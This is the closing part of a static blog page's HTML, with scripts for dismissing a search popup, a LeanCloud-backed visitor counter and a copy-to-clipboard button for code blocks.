      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });</script><script>function addCount(Counter) {
      var $visitors = $('.leancloud_visitors');
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();

      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
        .done(function({ results }) {
          if (results.length > 0) {
            var counter = results[0];
            
            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
            
              .done(function() {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.time + 1);
              })
            
              .fail(function ({ responseJSON }) {
                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
              })
          } else {
            
              Counter('post', '/classes/Counter', JSON.stringify({ title: title, url: url, time: 1 }))
                .done(function() {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(1);
                })
                .fail(function() {
                  console.log('Failed to create');
                });
            
          }
        })
        .fail(function ({ responseJSON }) {
          console.log('LeanCloud Counter Error: ' + responseJSON.code + ' ' + responseJSON.error);
        });
    }
    

    $(function() {
      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'XMCuiFsYYsbUlDih3XM5LI6F-9Nh9j0Va')
        .done(function({ api_server }) {
          var Counter = function(method, url, data) {
            return $.ajax({
              method: method,
              url: 'https://' + api_server + '/1.1' + url,
              headers: {
                'X-LC-Id': 'XMCuiFsYYsbUlDih3XM5LI6F-9Nh9j0Va',
                'X-LC-Key': 'T6DpDouJtaUHt3WMcHqcCrxD',
                'Content-Type': 'application/json',
              },
              data: data
            });
          };
          
            const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
            if (localhost.test(document.URL)) return;
            addCount(Counter);
          
        });
    });</script><script>$('.highlight').not('.gist .highlight').each(function(i, e) {
    var $wrap = $('<div>').addClass('highlight-wrap');
    $(e).after($wrap);
    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
        return $(e).text();
      }).toArray().join('\n');
      var ta = document.createElement('textarea');
      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
      ta.style.top = yPosition + 'px'; // Prevent page scroll
      ta.style.position = 'absolute';
      ta.style.opacity = '0';
      ta.readOnly = true;
      ta.value = code;
      document.body.appendChild(ta);
      const selection = document.getSelection();
      const selected = selection.rangeCount > 0 ? selection.getRangeAt(0) : false;
      ta.select();
      ta.setSelectionRange(0, code.length);
      ta.readOnly = false;
      var result = document.execCommand('copy');
      
        if (result) $(this).text('复制成功');
        else $(this).text('复制失败');
      
      ta.blur(); // For iOS
      $(this).blur();
      if (selected) {
        selection.removeAllRanges();
        selection.addRange(selected);
      }
    })).on('mouseleave', function(e) {
      var $b = $(this).find('.copy-btn');
      setTimeout(function() {
        $b.text('复制');
      }, 300);
    }).append(e);
  })</script></body></html>